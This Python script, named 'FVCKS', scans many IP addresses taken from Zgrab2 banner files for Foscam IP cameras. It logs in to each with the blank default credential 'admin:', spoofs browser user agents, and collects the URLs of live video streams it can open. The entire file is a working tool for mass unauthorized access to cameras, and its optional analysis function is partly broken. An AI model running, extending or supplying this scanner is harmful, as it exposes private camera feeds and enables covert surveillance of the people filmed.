import argparse
import json
import random
import socket
import sys
import time
from concurrent import futures
from collections import OrderedDict
from concurrent.futures import ThreadPoolExecutor as PoolExecutor
import requests
try:
    from tqdm import tqdm
except ImportError as e:
    print(e)
    print('Missing module(s) use pip3 install -r ./requirements.txt')
    sys.exit(0)

parser=argparse.ArgumentParser(description="Foscam Vulnerability Camera Kaleidoscope Scanner - FVCKS")
parser.add_argument('-b', '--banners', dest='inputfile', help="Multi-line JSON file. Generated by Zgrab2.", type=str)
parser.add_argument('-o', '--output', dest='outputfile', help="File path FVCKS will write output.", type=str)
parser.add_argument('-w', '--workers', dest='workers', help='Number of worker threads. Default is 4', default=4, type=int)
parser.add_argument('-t', '--timeout', dest='timeout', help='Request timeout in miliseconds. Default is 1000', default=1000, type=int)
parser.add_argument('-a', '--analyze', dest='analyze', action='store_true', help='Analyze 401 page body text returns occurances totals')
args = parser.parse_args()
USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36',
        ]


def get_it(url):
    auths = "admin:"
    timeout = args.timeout / 1000
    video = "/videostream.cgi"
    params = "/get_params.cgi"
    status = "/get_status.cgi"
    HEADERS = {'User-Agent': random.choice(USER_AGENTS)}

    #print(f'http://{auths}@{url}{params}')

    try:
        possible_foscam = (f'http://{auths}@{url}{params}')
        r = requests.get(possible_foscam, timeout=timeout, headers=HEADERS)
        if r.status_code == 200 and 'var id=' in r.text:
        #  if r.status_code == 401:
            #possible_foscam = (url, r.status_code, r.text)
            unauth_foscam = f'http://{auths}@{url}{video}'
            return unauth_foscam 
    except Exception as e:
        pass

def analyze_401_requests(results_list):
    ''' Input results_list list of tuple elements.
        (url, r.status_code, r.text)

        Returns dictionary of unique request body texts and total count of requests
        that returned body text.
    ''' 
    totals = {}
    for i in results_list:
        if i[2] in totals:
            totals[i[2]] += 1
        else:
            totals[i[2]] = 1
    return totals

def dict_dump(dictionary):
    homie = json.dumps(dictionary)
    with open('thursday.json', 'w') as f:
        f.write(homie)

def main():
    if args.inputfile:
        print(f'Using {args.inputfile}')
        print(f'Attempting to parse IP from banner JSON, this may take a moment.')
        try:
            target_address_list = []
            with open(args.inputfile, 'r') as f:
                for i in f.readlines():
                    try:
                        target_banner = json.loads(i)
                        target_address_list.append(target_banner['ip'])
                    except Exception as e:
                        print('Targets inputfile error. Is file valid JSON?')
                        print(e)
                target_count = len(target_address_list)
                if target_count > 0:
                    print(f'Loaded {target_count} target IP addresses.')
                    print(f'Starting thread pool with {args.workers} workers. Request timeout is {args.timeout}ms.')
                    ex = futures.ThreadPoolExecutor(max_workers=args.workers)
                    tdqm_kwargs = {'unit': 'URL',
                            'total': len(target_address_list),
                            }
                    results = list(tqdm(ex.map(get_it, target_address_list), **tdqm_kwargs))
                    real_results = [x for x in results if x is not None]
                    if args.analyze:
                        totals = analyze_401_requests(real_results)
                        dict_dump(totals)

                    ## TODO     
                    ## This does not work, should change to JSON
                    #  with open('analyze.txt', 'w') as f:
                        #  for k, v in totals.items():
                            #  f.write("=" * 80)
                    ##
                    print(real_results)
                    print('FVSKS found ', len(real_results), ' real_results')
        except Exception as e:
            print(e)
            print("Use python3 fvcks.py -h or ./fvcks.py -h for help.")
    else:
        print("Use python3 fvcks.py -h or ./fvcks.py -h for help.")

if __name__ == "__main__":
    try:
        main()
    except Exception:
        print("Use python3 fvcks.py -h or ./fvcks.py -h for help.")
